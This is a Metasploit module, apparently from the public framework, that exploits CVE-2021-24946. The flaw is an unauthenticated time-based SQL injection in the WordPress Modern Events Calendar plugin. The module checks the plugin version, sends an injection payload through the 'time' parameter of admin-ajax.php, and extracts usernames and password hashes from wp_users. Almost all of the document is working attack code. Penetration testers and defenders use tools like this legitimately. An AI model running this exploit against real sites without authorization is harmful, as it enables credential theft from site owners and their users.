##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Modern Events Calendar SQLi Scanner',
        'Description' => %q{
          Modern Events Calendar plugin contains an unauthenticated timebased SQL injection in
          versions before 6.1.5.  The time parameter is vulnerable to injection.
        },
        'Author' => [
          'h00die', # msf module
          'Hacker5preme (Ron Jost)', # edb
          'red0xff' # sqli lib assistance
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'EDB', '50687' ],
          [ 'CVE', '2021-24946' ],
          [ 'URL', 'https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24946/README.md' ],
          [ 'WPVDB', '09871847-1d6a-4dfe-8a8c-f2f53ff87445' ]
        ],
        'Actions' => [
          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }],
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2021-12-13'
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1])
    ]
  end

  def check_host(_ip)
    unless wordpress_and_online?
      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')
    end

    checkcode = check_plugin_version_from_readme('modern-events-calendar-lite', '6.1.5')
    if checkcode == Msf::Exploit::CheckCode::Safe
      return Msf::Exploit::CheckCode::Safe('Modern Events Calendar version not vulnerable')
    end

    print_good('Vulnerable version of Modern Events Calendar detected')
    checkcode
  end

  def run_host(ip)
    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload| # also tried encoder: :base64 and still not quite getting the right answer.
      d = Rex::Text.rand_text_numeric(4)
      # the webapp takes this parameter and uses it two times in the query, therefore our sleep is 2x what it should be. so we need to cut it.
      payload = payload.gsub(/sleep\(\d+\.\d+\)/i, "sleep(#{datastore['SQLIDELAY'] / 2})")

      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_get' => {
          'action' => 'mec_load_single_page',
          # taken from sqlmap
          'time' => "#{Rex::Text.rand_text_numeric(1)}) AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)}) AND (#{d}=#{d}"
        }
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end
    unless @sqli.test_vulnerable
      fail_with Failure::PayloadFailed, "#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay."
    end

    columns = ['user_login', 'user_pass']
    results = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])
    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
    results.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
        private_data: user[1],
        service_name: 'Wordpress',
        address: ip,
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << user
    end
    print_good(table.to_s)
  end
end
